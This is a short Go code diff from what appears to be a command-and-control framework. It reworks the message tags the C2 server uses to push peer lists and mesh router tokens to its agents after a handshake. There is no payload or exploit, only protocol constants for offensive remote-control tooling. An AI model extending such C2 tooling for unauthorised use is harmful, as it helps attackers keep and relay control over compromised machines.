@@ -22,9 +22,6 @@ type MeshNodeMeta struct {
 	P2PTransport string      `cbor:"6,keyasint"` // transport this node's relay listens on (kcp/mtls/smb)
 }
 
-// TagAgentToken is the MsgTunData tag for token push from C2 to agent.
-const TagAgentToken = "agent_token"
-
 // TagCheckinOK is the C2 -> agent MsgTunData tag acknowledging a check-in.
 const TagCheckinOK = "checkin-ok"
 
@@ -32,8 +29,9 @@ const TagCheckinOK = "checkin-ok"
 // keep-alive response once PFS is established).
 const TagHandshake = "handshake"
 
-// TagPeerList is the MsgTunData tag for P2P peer list push from C2 to agent.
-const TagPeerList = "peer_list"
+// TagSessionInfo is the MsgTunData tag for the post-handshake session state
+// push (peer list and/or mesh router token).
+const TagSessionInfo = "session_info"
 
 // CapabilityRouter is the capability value that authorises a node to serve
 // as a mesh router (accept relay connections and pipe them to C2).
